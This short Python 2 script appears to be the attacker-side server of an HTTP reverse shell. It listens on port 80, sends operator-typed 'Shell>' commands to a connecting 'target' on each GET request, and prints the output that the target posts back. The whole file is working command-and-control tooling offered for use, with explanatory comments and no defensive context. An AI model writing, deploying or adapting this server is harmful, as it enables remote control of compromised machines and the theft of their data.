#Credit to https://jo.linkedin.com/in/python2
#implement in python2

import BaseHTTPServer 
HOST_NAME = '0.0.0.0' 
PORT_NUMBER = 80  


class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler): 


    def do_GET(s):
       
        command = raw_input("Shell> ") #take user input
        s.send_response(200) #return HTML status 200 (OK)
        s.send_header("Content-type", "text/html") # Inform the target that content type header is "text/html"
        s.end_headers()
        s.wfile.write(command) #send the command which we got from the user input


    def do_POST(s):
                                                     #If we got a POST, we will:- 
        s.send_response(200) #return HTML status 200 (OK)
        s.end_headers()
        length = int(s.headers['Content-Length']) 
                                                     #value has to be integer 
        postVar = s.rfile.read(length) # Read then print the posted data
        print (postVar)



if __name__ == '__main__':


  
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)



    try: 
        httpd.serve_forever() 
    except KeyboardInterrupt: 
        print ('[!] Server is terminated')
        httpd.server_close()
